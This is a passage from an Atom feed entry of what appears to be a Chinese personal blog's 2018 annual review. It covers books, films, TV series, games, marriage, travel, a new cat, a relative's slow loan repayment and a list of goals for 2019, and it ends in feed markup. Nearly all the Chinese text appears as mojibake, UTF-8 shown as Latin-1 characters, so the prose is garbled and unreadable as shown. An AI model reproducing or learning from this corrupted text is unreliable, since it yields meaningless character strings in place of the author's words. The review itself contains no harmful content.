å†™ä¸‹ä¸€ä¸ªå®šç†å¹¶é™„å¸¦è¯æ˜ã€‚è¿™ä¸æ˜¯å¼€å§‹ï¼Œè¿™æ˜¯ç»“æŸã€‚å¯¹æˆ‘æ¥è¯´ï¼Œæ•°å­¦çš„åˆ›é€ æ€§åœ¨ä½ åŠ¨æ‰‹åœ¨çº¸ä¸Šå†™å­—ä¹‹å‰ï¼Œåœ¨ä½ å°è¯•å†™å…¬å¼ä¹‹å‰ã€‚ä½ æç»˜ä¸åŒçš„äº‹ç‰©ï¼Œåœ¨è„‘æµ·ä¸­åå¤æ€è€ƒã€‚ä½ å°è¯•çš„åˆ›é€ ï¼Œå°±åƒéŸ³ä¹å®¶è¯•å›¾åˆ›ä½œéŸ³ä¹ï¼Œæˆ–è¯—äººå†™è¯—ä¸€æ ·ã€‚è¿™ä¸ªè¿‡ç¨‹æ²¡æœ‰å¯ä»¥éµå¾ªçš„è§„å¾‹ï¼Œä½ å¿…é¡»æ‰¾åˆ°è‡ªå·±çš„æ–¹æ³•ã€‚ä½†åˆ°äº†æœ€åï¼Œå°±åƒä½œæ›²å®¶å¿…é¡»å†™ä¸‹ä¹è°±ä¸€æ ·ï¼Œä½ å¿…é¡»æŠŠå®ƒå†™ä¸‹æ¥ã€‚ä½†æœ€é‡è¦çš„ä¸€æ­¥æ˜¯ç†è§£ã€‚è¯æ˜å…¬å¼æœ¬èº«å¯èƒ½ä¸èƒ½è®©ä½ ç†è§£ã€‚ä½ å¯èƒ½æœ‰ä¸€ä¸ªå¾ˆé•¿çš„è¯æ˜ï¼Œä½†åˆ°æœ€åå´ä¸çŸ¥é“å®ƒä¸ºä½•æ˜¯è¿™æ ·ã€‚ä½†ä¸ºäº†ç†è§£ï¼Œä½ å¿…é¡»æ‰¾åˆ°ç±»ä¼¼äºç›´è§‰çš„èƒ½åŠ›ï¼Œä½ å¿…é¡»æ„Ÿå—å®ƒã€‚ã€</p><p>â€”â€”è¿ˆå…‹å°”Â·é˜¿è’‚äºšçˆµå£«</p></blockquote><h3><span id="qi-ta-lei">å…¶ä»–ç±»</span></h3><ul><li>ã€Šé»‘å®¢ï¼ˆè®¡ç®—æœºé©å‘½çš„è‹±é›„ï¼‰ã€‹ï¼šå®¶é…¿è®¡ç®—æœºä¿±ä¹éƒ¨ä»¥åŠä¸Šå¤é»‘å®¢çš„äº‹è¿¹ï¼Œçœ‹å®Œè¿™ä¸ªå¯ä»¥çœ‹çœ‹ <strong>ã€Šé»‘é•œï¼šæ½˜è¾¾æ–¯å¥ˆåŸºã€‹</strong>ï¼Œå¯ä»¥çœ‹åˆ°è®¸å¤šå½±å­ã€‚</li><li>ã€Šæ­¤é—´çš„å°‘å¹´ã€‹ï¼Œæ±Ÿå—ï¼šä¹‹å‰æ²¡çœ‹å®Œè¡¥ä¸Šçš„ã€‚</li></ul><p>ä»Šå¹´çœ‹çš„éæŠ€æœ¯ä¹¦åŸºæœ¬éƒ½æ˜¯åœ¨ä¸Šä¸‹ç­åç€å…¬äº¤çœ‹çš„ï¼Œç§¯å°‘æˆå¤šï¼Œä¹Ÿå°±å¤šäº†ã€‚ä»Šå¹´çš„ä½“ä¼šå°±æ˜¯è¯»ä¹¦å¦‚æŠ½ä¸ã€‚å¤šè¯»ä¹¦æ¶¨è§è¯†ã€‚</p><h2><span id="dian-ying-dian-shi-ju">ç”µå½±ã€ç”µè§†å‰§</span></h2><p>å¹³å¸¸çœ‹ç”µå½±ç”µè§†æœ‰æ—¶å€™å–œæ¬¢å†™ç€ä»£ç ï¼Œå¯èƒ½ä¹Ÿä¸å¤ªè®°å¾—å¤ªå¤šï¼Œè®²è®²å–œæ¬¢çš„å§ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/51374373-c5620080-1b3d-11e9-8be9-45074f4f2954.png" alt="movies"></p><ul><li>ã€Šç¢Ÿä¸­ç¢Ÿ6ï¼šå…¨é¢ç“¦è§£ã€‹ï¼šé˜¿æ±¤å“¥ä¸è€å¼€æŒ‚ã€‚</li><li>ã€Šdele ãƒ‡ã‚£ãƒ¼ãƒªãƒ¼ äººç”Ÿåˆ é™¤äº‹åŠ¡æ‰€ã€‹ï¼šå…¶å®ä¸å–œæ¬¢ï¼Œä»¥åˆ é™¤äººç”Ÿçš„åä¹‰å·çª¥ä»¥è‡³ä¿®æ”¹åˆ«äººçš„äººç”Ÿã€‚</li><li><strong>ã€ŠçŸ¥æ— æ¶¯è€… The Man Who Knew Infinityã€‹</strong>ï¼šå°åº¦å°å“¥å¼€å¯æŒ‚æ¥è¿å“ˆä»£éƒ½æœã€‚</li><li><strong>ã€Šè¶…çº§ç§‘å­¦ä¼™ä¼´ã€‹</strong>ï¼šå’Œä¸€ç¾¤ç‚¹äº†â€œè¶…äººâ€æŠ€èƒ½æ ‘çš„ç§‘å­¦å®¶ä¸€èµ·æ‹¯æ•‘ä¸–ç•Œæ˜¯ä¸€ç§æ€æ ·çš„ä½“éªŒã€‚</li><li><strong>ã€Šæˆ‘çš„ä¸‰ä½“ã€‹</strong>ï¼ˆç¬¬ä¸€å­£ï¼Œç¬¬äºŒå­£ï¼‰ï¼šã€Šæˆ‘çš„ä¸–ç•Œã€‹+ã€Šä¸‰ä½“ã€‹ç®€ç›´ä¸è¦å¤ªå¼€å¿ƒï¼Œå¯èƒ½æ˜¯å”¯ä¸€çš„è§†é¢‘ç”»é¢è´¨é‡ä»¥å¯è§çš„é€Ÿåº¦åœ¨å˜åŒ–çš„åŠ¨ç”»ã€‚</li><li>ã€Šç¥å¥‡åŠ¨ç‰©ï¼šæ ¼æ—å¾·æ²ƒä¹‹ç½ªã€‹ï¼šæŒ–å‘ä¹‹ä½œï¼Œâ€œè‹±ç‰¹çº³é›„è€å°”ï¼Œå°±ä¸€å®šè¦å®ç°ï¼â€ã€‚</li><li><strong>ã€Šç¥ç§˜åšå£«ã€‹</strong>ï¼ˆç¬¬åä¸€å­£ï¼‰ï¼šæ¢äº†ç¼–å‰§ä¹‹ååä¸‰å§¨æ²¡æœ‰è‡ªå·±çš„ç‰¹ç‚¹ï¼ŒæœŸå¾…åœ£è¯ä¹‹åçš„å‡ é›†èƒ½å¥½è½¬ã€‚</li><li>ã€Šé‚ªä¸å‹æ­£ã€‹ï¼šå¦‚æœé‚£ä¸ªåŒ—äº¬åŸæ˜¯çœŸçš„ã€‚</li><li>ã€Šä¸–ç•Œå¥‡å¦™ç‰©è¯­ 2018å¹´æ˜¥å­£ç‰¹åˆ«ç¯‡ã€‹ï¼šæ„å¤–å¥½çœ‹ä¸€äº›ã€‚</li><li><strong>ã€Šè¾›æ™®æ£®ä¸€å®¶ã€‹</strong>ï¼ˆç¬¬ä¸‰åå­£ï¼‰ï¼šå°é»„äººä¸€å®¶çš„æ•…äº‹ã€‚</li><li><strong>ã€Šå­¤ç‹¬çš„ç¾é£Ÿå®¶ã€‹</strong>ï¼ˆç¬¬ä¸ƒå­£ï¼‰ï¼šâ€œå‡­è°é—®ï¼Œå»‰é¢‡è€çŸ£ï¼Œå°šèƒ½é¥­å¦ï¼Ÿâ€</li><li><strong>ã€Šæ·±å¤œé£Ÿå ‚ã€‹</strong>ï¼ˆç¬¬ä¸‰å­£ï¼‰ï¼šçœ‹çš„ä¸æ˜¯èœï¼Œæ˜¯äººé—´ç™¾å‘³ã€‚</li></ul><h2><span id="you-xi">æ¸¸æˆ</span></h2><p>å¹´åˆä¹°äº† Nitendo Switchï¼Œä¸è¿‡æ²¡æœ‰å¤ªå¤šæ—¶é—´èŠ±åœ¨ç©æ¸¸æˆä¸Šï¼Œä»¥è‡³äºã€Šå¡å°”è¾¾ä¼ è¯´ï¼šè’é‡ä¹‹æ¯ã€‹å’Œã€Šè¶…çº§é©¬é‡Œå¥¥ï¼šå¥¥å¾·èµ›ã€‹éƒ½æ²¡æœ‰é€šå…³ï¼Œåªæ˜¯å¶å°”ç”¨æ¥ç©ç© AoVï¼Œä¸è¿‡ NS çš„ä½“éªŒç¡®å®éå¸¸ä¸é”™ï¼Œä¸è®ºæ˜¯ä¸ªäººè¿˜æ˜¯è”æœºï¼Œå€¼å¾—æ¨èã€‚ä¸ªäººè§‰å¾—æ¸¸æˆåœ¨äºå¨±ä¹æ”¾æ¾ï¼Œè‹¥å½±å“æ­£å¸¸å·¥ä½œå’Œæƒ…ç»ªåˆ™è§†ä¸ºä¸å¯ï¼Œæ›¾è®°å¾—å¤§å­¦ç©æ¸¸æˆè¿˜å†²åˆ«äººå‘è¿‡è„¾æ°”ä¹Ÿæ˜¯å¤ªå¹´è½»ã€‚</p><h3><span id="wang-zhe-rong-yao-he-arena-of-valor">ã€Šç‹è€…è£è€€ã€‹ å’Œ ã€ŠArena of Valorã€‹</span></h3><p>æˆ‘åœ¨ç‹è€…è£è€€S13èµ›å­£åˆé‡æ–°ç©äº†ä¸€æ®µæ—¶é—´ï¼Œæ¯å¤©ä¸‰äº”å±€ï¼Œå‡ä¸ªä¸€æ˜Ÿä¸¤æ˜Ÿå°±åœæ­¢ï¼Œæ‰ä¸ªä¸€æ˜Ÿä¸¤æ˜Ÿä¹Ÿåœæ­¢ï¼Œå°±è¿™æ ·è¾¾åˆ°äº†ä¸ªäººå†å²æœ€å¥½æˆç»©ï¼Œä¸è¿‡è¿™ä¸ªè¿‡ç¨‹ç»™æˆ‘å¸¦æ¥çš„å½±å“ä¹Ÿä¸å°‘ã€‚ä¸€ä¸ªæ˜¯æˆ‘å‘ç°åœ¨ç™½å¤©çš„é˜Ÿå‹æ¯”è¾ƒå‘ï¼Œè€Œåˆ°äº†å¤œæ™šä¼šå¥½å¾ˆå¤šï¼Œä¼°è®¡æ˜¯å°å­¦ç”Ÿéƒ½å»ç¡è§‰äº†ï¼Œæ‰€ä»¥æˆ‘æ¯åˆ°åä¸€äºŒç‚¹å°±å¼€å§‹ç©ï¼Œæœ‰æ—¶ä¼šå› ä¸ºè¿èƒœè€Œç©åˆ°å¾ˆæ™šï¼Œä»¥è‡´åœæ­¢ä¸€æ®µæ—¶é—´ä¹‹åä»ä¸èƒ½å¥½å¥½æ—©ç¡ï¼Œä¸¥é‡å½±å“ç²¾ç¥çŠ¶æ€ï¼›äºŒæ˜¯ä¸€å±€ç»“æŸåˆå¼€ä¸€å±€ï¼ŒçŠ¹å¦‚èµŒåšï¼Œèµ¢åˆ™æ›´æƒ³èµ¢ï¼Œè¾“åˆ™ä¸æœæ°”ï¼Œå¾€å¾€è®¡è¾ƒäºä¸€åŸå¾—å¤±ï¼Œå®åœ¨æ˜¯å½±å“å¿ƒæ°”ã€‚è¿™ä¸ªæ¸¸æˆä¸èƒ½æŠ•å…¥å¤ªå¤šæ—¶é—´ã€‚</p><h3><span id="sai-er-da-chuan-shuo-huang-ye-zhi-xi-he-chao-ji-ma-li-ao-ao-de-sai">ã€Šå¡å°”è¾¾ä¼ è¯´ï¼šè’é‡ä¹‹æ¯ã€‹ å’Œ ã€Šè¶…çº§é©¬é‡Œå¥¥ï¼šå¥¥å¾·èµ›ã€‹</span></h3><p><img src="https://user-images.githubusercontent.com/3297411/51376783-24c30f00-1b44-11e9-9991-97de85cf9fc2.jpeg" alt="zelda"></p><p>å¾ˆä¸é”™çš„æ¸¸æˆï¼Œåªæ˜¯éƒ½è¿˜æ²¡æœ‰ç©é€šå…³ï¼Œéœ€è¦è¡¥ä¸Šã€‚</p><h3><span id="lu-xing-qing-wa">ã€Šæ—…è¡Œé’è›™ã€‹</span></h3><p>å°±å’Œå…»å„¿å­ä¸€æ ·ï¼ˆè™½ç„¶ä½œè€…è¯´çš„æ˜¯ä¸ˆå¤«ï¼‰ï¼Œæ€»æ˜¯æ‹…å¿ƒç§ç§ï¼Œåƒæ²¡åƒå¥½ï¼Œæœ‰æ²¡æœ‰è¢«é›¨æ·‹ï¼Œæœ‰æ²¡æœ‰è¢«æ¬ºè´Ÿï¼Œè·¯ä¸Šè¿˜æœ‰é’±å—ã€‚è¿™å°±æ˜¯ä¸ºäººçˆ¶æ¯çš„ä½“éªŒå§ã€‚</p><h3><span id="chi-ji">åƒé¸¡</span></h3><p>æ¥è§¦ä¸å¤šï¼Œä¸è¿‡å’Œã€Šç‹è€…è£è€€ã€‹è¿™ç§æ˜¯ä¸€æ ·çš„æ„Ÿå—ã€‚çœ‹è¿‡ä¸€äº›æ¸¸æˆä¸»æ’­çš„è§†é¢‘ï¼Œä½©æœä¸€ä¸ªLOLèŒä¸šç©å®¶è½¬åƒé¸¡çš„ä¸»æ’­ï¼Œåœ¨æˆ˜åœºä¸Šæ²‰ç¨³ï¼Œæœ‰åˆ¤æ–­ã€‚</p><h3><span id="ingress">Ingress</span></h3><p>å·²ç»å¼ƒå‘äº†ï¼Œä¸€åˆ™æ˜¯å› ä¸ºæ»¡çº§äº†ï¼Œå¹¶æ²¡æœ‰åˆ·æˆå°±çš„ä¹ æƒ¯ï¼ŒåŒæ—¶ä¹Ÿå› ä¸ºæ²¡æœ‰å¤ªå¤šæ—¶é—´å‡ºé—¨ï¼ŒäºŒåˆ™å®˜æ–¹ä¸€ç›´æ²¡æœ‰å¤ªå¤šçš„ç§¯ææ´»åŠ¨ï¼Œæ¯æ¬¡å°±æ˜¯æ¢ä¸€ä¸ªåœ°æ–¹åˆ·ç‰Œå­ï¼Œå†åˆ™åœ¨æ‰‹æœºå‡çº§åˆ° iOS 11 ä¹‹åï¼Œå®˜æ–¹æ¨å‡ºäº† Ingress Primeï¼Œæ¸¸æˆä½“éªŒä¸‡åˆ†ç³Ÿç³•ï¼Œä¹‹å‰çš„ç‰ˆæœ¬å´ä¸å‡çº§ï¼Œé‚å¼ƒã€‚Ingressç©äº†å››äº”å¹´ï¼Œä¹Ÿç–¯ç‹‚è¿‡ï¼Œä½†æ˜¯è¿˜æ˜¯ç¦»å¼€å§ã€‚</p><h2><span id="sheng-huo">ç”Ÿæ´»</span></h2><ol><li>å©šå§»</li></ol><p>ä»Šå¹´ä¸€å¤§äº‹å°±æ˜¯å’Œè€å©†é¢†è¯äº†ï¼Œè¿˜æ²¡æœ‰åŠé…’å¸­ï¼Œä¸¤äººéƒ½å•†é‡ç€ç®€åŠï¼Œè¯·äº²æˆšåƒä¸ªé¥­å°±æ„Ÿè§‰å·²ç»å¾ˆéš†é‡äº†ã€‚å‚åŠ äº†å‡ æ¬¡åŒå­¦çš„å©šç¤¼ï¼Œæ— éæ¥äº²ï¼Œé—¹æ–°éƒï¼Œå®£ä¸ªèª“è¨€ï¼Œåœ¨ä¼—äº²å‹é¢å‰æŒ¥æ³ªæ„Ÿæ©ï¼Œå¯¹äºè¿™æ ·é‡å¤çš„å©šç¤¼ï¼Œä¹Ÿæ²¡æœ‰å¤ªå¤§çš„å…´è¶£ã€‚æ¢¦æƒ³äººç”Ÿçš„å©šç¤¼åº”å½“åˆºæ¿€ï¼Œå¯ä»¥åœ¨è¿œå±±ï¼Œæˆ–è€…ï¼Œæ‹›å¾…ä¸€ç¾¤å¥½å‹ï¼Œå‡†å¤‡ä¸€å †é£Ÿç‰©ï¼Œå‡†å¤‡ä¸€æ®µç»™å¤§å®¶çš„è¡¨æ¼”ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥ä¸Šå°è¡¨æ¼”ï¼Œå‘è¡¨è‡ªå·±çš„æ„Ÿæƒ³ã€‚</p><ol start="2"><li>æ—…è¡Œ</li></ol><ul><li>7æœˆåœ¨äº‘å°å±±ï¼Œçœ‹å¤§å±±ï¼Œæ‰“æ°´æˆ˜ï¼Œèˆ’ç•…ã€‚</li><li>9æœˆé’é¾™å³¡ï¼Œäººç”Ÿç¬¬ä¸€æ¬¡è¹¦æï¼Œåˆºæ¿€ã€‚</li><li>10æœˆæ¹–å—é•¿æ²™ï¼Œçœ‹æ©˜å­æ´²å¤´ï¼Œå“é•¿æ²™è‡­è±†è…ï¼Œä¸€èˆ¬ã€‚</li></ul><ol start="3"><li>å…»çŒ«</li></ol><p><img src="https://user-images.githubusercontent.com/3297411/51398607-fdd5fe80-1b7e-11e9-901d-beeb45277005.jpg" alt="cat"></p><p>11æœˆï¼Œè¿æ¥å®¶åº­å¦ä¸€ä¸ªæˆå‘˜ï¼Œä¸€åªè‹±å›½çŸ­æ¯›è“çŒ«ï¼Œå–åâ€œç‹—ç‹—â€ã€‚è™½ç„¶æœ‰æ—¶ä¼šè§‰å¾—è¿™å’Œå–ç‹—è›‹å·®ä¸å¤šï¼Œä¹Ÿä¸çŸ¥é“ä¼šä¸ä¼šè®©å…¶ä»–çŒ«çœ‹ä¸èµ·ã€‚ç¬¬ä¸€æ¬¡å…»çŒ«ï¼Œæ€»æ˜¯æ‹…å¿ƒè¿™æ‹…å¿ƒé‚£ï¼Œç”Ÿæ€•ä»–ç”Ÿç—…äº†ï¼Œåƒæäº†çˆ¶æ¯ã€‚ä¹…äº†æˆ‘ä¹Ÿå‘ç°ä»–è¿˜æ˜¯å¾ˆç²˜äººçš„ï¼Œä¸çŸ¥é“å¹´åç»™ä»–æ‰¾äº†å¥³æœ‹å‹ä¹‹åä¼šä¸ä¼šè¿˜æ˜¯è¿™ä¹ˆç²˜äººã€‚</p><ol start="4"><li>å…³äºäº²æˆšå’Œé’±</li></ol><p>åæœˆï¼Œå ‚å¼Ÿæ‰¾æˆ‘å€Ÿé’±å‘¨è½¬ï¼Œå¹¶æ‰¿è¯ºå››å¤©è¿˜ï¼Œé‰´äºæœ‰æ‰¿è¯ºè€Œä¸”æ˜¯äº²æˆšï¼Œä¹Ÿå°±çˆ½å¿«å€Ÿäº†ã€‚ç¬¬ä¸€æ¬¡åˆ°æœŸæ²¡ä»»ä½•åŠ¨é™ï¼Œè¿˜é’±è¿˜æ˜¯å†æ¥ç€ä¸€å¥è¯ä¹Ÿæ²¡è¯´ï¼Œæˆ‘é—®äº†æ‰æ¢æ¥ä¸€å¥â€œæ˜å¤©ï¼Œæ˜å¤©ä¸€å®šæ¢â€ï¼Œæ¥ç€ç¬¬äºŒæ¬¡å°±æ˜¯â€œæœ€è¿Ÿä¸ä¼šè¶…è¿‡åå¤©ä¸‹åˆâ€ï¼Œç„¶åæ˜¯åˆ°æœŸè¿˜äº†ä¸€åŠï¼Œæˆ‘æ²¡æ”¶ï¼Œè¦å…¨æ¬¾ï¼Œå°±ç»§ç»­æ‹–ç€ï¼Œä¸€æ˜ŸæœŸæ²¡åŠ¨é™ï¼Œé—®äº†å‡ å¥å°±å˜æˆåœ¨å¤–åœ°å­¦ä¹ æ²¡å¼€æ‰‹æœºï¼Œâ€œæ˜å¤©ä¸‹åˆä¸‰ç‚¹ä¹‹å‰â€ï¼Œç„¶åâ€œå†ç»™ä¸€ä¸ªå°æ—¶â€ï¼Œâ€œæˆ‘æ‰‹æœºæ²¡ç”µäº†â€ã€‚æœ€åé’±æ˜¯è¿˜äº†ï¼Œä½†æ˜¯æˆ‘å¯¹ä»–çš„ä¿¡ä»»ä¸€ç‚¹éƒ½æ²¡æœ‰äº†ï¼Œç›´æ¥æ‹‰é»‘ï¼è¿™ä»¶äº‹è®©ä¼™æˆ‘è®¤è¯†åˆ°ä¸€ç‚¹ï¼šåœ¨é’±é¢å‰ï¼Œäº²æˆšçš„å˜´è„¸ä¹Ÿæ˜¯ä»¤äººæ¶å¿ƒçš„ã€‚æˆ‘å€Ÿé’±æ˜¯å› ä¸ºæˆ‘ä¿¡ä»»ï¼Œå´ä¸ä»£è¡¨ä½ å¯ä»¥è·µè¸ã€‚æƒ³èµ·ä¸€ä¸ªæ‘æ°‘ä¸­å¥–å´è¢«æ‘é‡Œäººå€Ÿå¾—å€¾å®¶è¡äº§ï¼Œæ‘é‡Œäººå´è§‰å¾—ä»–æœ‰é’±ä¸ºä»€ä¹ˆå°±ä¸èƒ½å€Ÿç‚¹ï¼Œå¯æ€•ã€‚</p><h2><span id="zhan-wang-2019">å±•æœ›2019</span></h2><p>ç»ä¸æ˜¯flagã€‚</p><ol start="0"><li>åšä¸€ä»½å…³äºPythonçš„çŸ¥è¯†å°é›†ï¼Œä¸æ±‚å¤šï¼Œä½†æ±‚è®°å½•ä¸‹ä¸€äº›æ˜“é”™ï¼Œæœ‰æ·±åº¦çš„å°çŸ¥è¯†ç‚¹ã€‚åŒæ—¶è¿‡ä¸€éPythonçš„å‚è€ƒæ–‡æ¡£ï¼Œé˜…è¯»ä¸€äº›æ¡†æ¶æºç ã€‚</li><li>ç»´æŠ¤ç°æœ‰å¼€æºç¿»å¢™é¡¹ç›®ã€‚</li><li>æ¯ä¸¤å‘¨è‡³å°‘ä¸€ç¯‡åšå®¢ï¼Œè®°å½•çš„å†…å®¹ä¸èƒ½å¤ªåŸºç¡€ï¼Œéœ€è¦æœ‰æ€è€ƒã€‚</li><li>æ·±å…¥äº†è§£è®¡ç®—æœºåŸºç¡€ï¼ŒåŒ…æ‹¬ç³»ç»ŸåŸç†ã€æ•°æ®ç»“æ„å’Œç®—æ³•ã€ç½‘ç»œåŸºç¡€å’Œç¼–è¯‘åŸç†ï¼Œè¿™å››ä¸ªæ–¹é¢æ¯ä¸€ä¸ªéƒ½é˜…è¯»ä¸€æœ¬ä¹¦ç±ï¼Œç†è§£å¹¶æŒæ¡å¸¸ç”¨å†…å®¹ã€‚</li><li>åœ¨leetcodeä¸Šåˆ·50é¢˜ã€‚</li><li>æœºå™¨å­¦ä¹ ï¼šå­¦å®Œfast.aiçš„æœºå™¨å­¦ä¹ è¯¾ç¨‹ã€‚</li><li>æ·±åº¦å­¦ä¹ ï¼šå­¦ä¹ fast.aiçš„æ·±åº¦å­¦ä¹ è¯¾ç¨‹ï¼Œå¯¹åº”åŒæ­¥é˜…è¯»èŠ±ä¹¦ã€‚</li><li>å‡å°‘æ¸¸æˆæ—¶é—´ï¼Œä¸åœ¨åä¸€ç‚¹ä»¥åç©æ¸¸æˆã€‚</li><li>å­¦ä¼šäº”ç¬”æ‰“å­—ï¼Œé€Ÿåº¦è‡³å°‘èƒ½è¾¾åˆ°60å­—/åˆ†é’Ÿã€‚</li><li>åœ¨App storeä¸Šè‡³å°‘ä¸Šæ¶ä¸€ä¸ªAppã€‚</li><li>äº†è§£æŠ•èµ„ç›¸å…³å†…å®¹ã€‚</li></ol><h2><span id="xie-zai-zui-hou">å†™åœ¨æœ€å</span></h2><p>äººç”Ÿéœ€è¦æœ‰ç›®æ ‡ï¼Œéœ€è¦ä¸€ä¸ªç§¯æä¹è§‚çš„å¿ƒæ€ï¼Œå’Œä¸€ç¾¤å¿—åŒé“åˆçš„åŒä¼´ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å¹´åº¦æ€»ç»“ - 2018å¹´å…¨å¹´å¤ç›˜
    
    </summary>
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="æ€»ç»“" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
</feed>
